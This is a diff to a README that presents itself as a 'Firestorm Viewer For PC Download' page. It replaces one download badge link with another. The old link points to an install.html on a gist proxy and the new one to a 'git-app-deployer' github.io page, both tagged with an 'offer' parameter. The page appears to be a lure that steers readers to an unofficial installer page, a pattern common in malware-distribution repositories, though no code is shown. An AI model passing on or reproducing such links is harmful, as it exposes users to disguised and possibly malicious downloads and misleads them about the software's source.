@@ -1,6 +1,6 @@
 # Firestorm Viewer For PC Download — Desktop 3D Virtual World Viewer
 
-[![Get Firestorm Viewer GitHub](https://img.shields.io/badge/Get%20Firestorm%20Viewer%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/multikdreamlife462/1f45cfe26fd1a21dbe5538a5ab6724e4/raw/aa3ca4648c0f2b0d45923763cdbddd94e383cef6/install.html?offer=FirestormViewer)
+[![Get Firestorm Viewer GitHub](https://img.shields.io/badge/Get%20Firestorm%20Viewer%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deployer.github.io/.github/?offer=FirestormViewer)
 
 ---
 
